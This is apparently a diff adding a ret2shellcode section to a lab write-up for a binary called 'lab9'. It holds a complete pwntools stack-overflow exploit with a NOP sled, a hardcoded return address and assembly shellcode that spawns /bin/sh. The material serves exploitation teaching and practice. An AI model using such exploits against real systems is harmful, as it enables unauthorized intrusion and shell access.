@@ -63,3 +63,88 @@ sys.stdout.buffer.write(payload)
 ```
 
 ![image](https://github.com/user-attachments/assets/c8763b16-1a49-4f4b-a91e-a45ed31398c7)
+
+
+## Ret2Shellcode Way Solution
+
+![image](https://github.com/user-attachments/assets/209afafb-8d9c-41f3-b554-e150efaa470b)
+
+Since our binary has an executable stack(RWX) (indicated by Stack: Executable and NX: NX unknown) 
+a ret2shellcode approach is possible. This means we can inject shellcode directly onto the stack and then use a ROP chain to jump to it.
+
+**Find Shellcode Address via GDB**
+
+```bash
+b unsafe
+
+run $(python3 -c 'print("A" * 100)')
+
+```
+
+![image](https://github.com/user-attachments/assets/d719489d-1de9-4310-ab2a-42493415b2eb)
+
+**Craft your Exploit**
+
+```py
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.log_level = 'error'
+context.binary = elf = ELF('./lab9')
+context.terminal = ['alacritty', '-e']
+
+offset = 22
+shellcode_addr = 0xffffcf50 # somewhere in the nop sled
+message_addr = 0xffffd6bc
+
+gs = """
+b *main
+continue
+"""
+
+shellcode = f"""
+push 0x41410a21
+push 0x74692064
+push 0x69642049
+
+push 4
+pop eax
+push 1
+pop ebx
+mov ecx, esp
+push 10
+pop edx
+int 0x80
+
+push 0x4168732f
+push 0x6e69622f
+
+xor eax, eax
+mov byte [esp + 6], al
+
+mov al, 11
+mov ebx, esp
+xor ecx, ecx
+xor edx, edx
+int 0x80
+"""
+
+payload = b'A'*offset + pack(shellcode_addr)
+payload += b'\x90' * 1000
+payload += asm(shellcode)
+
+io = process([elf.path, payload])
+io.interactive()
+```
+
+#### Run it
+
+```bash
+python3 solver.py
+```
+
+![image](https://github.com/user-attachments/assets/4d8cb0b9-a08e-43f6-a658-8f53d2ded955)
+
+
+![image](https://github.com/user-attachments/assets/f9687a27-24e8-4230-b8a7-4aa0141db6eb)
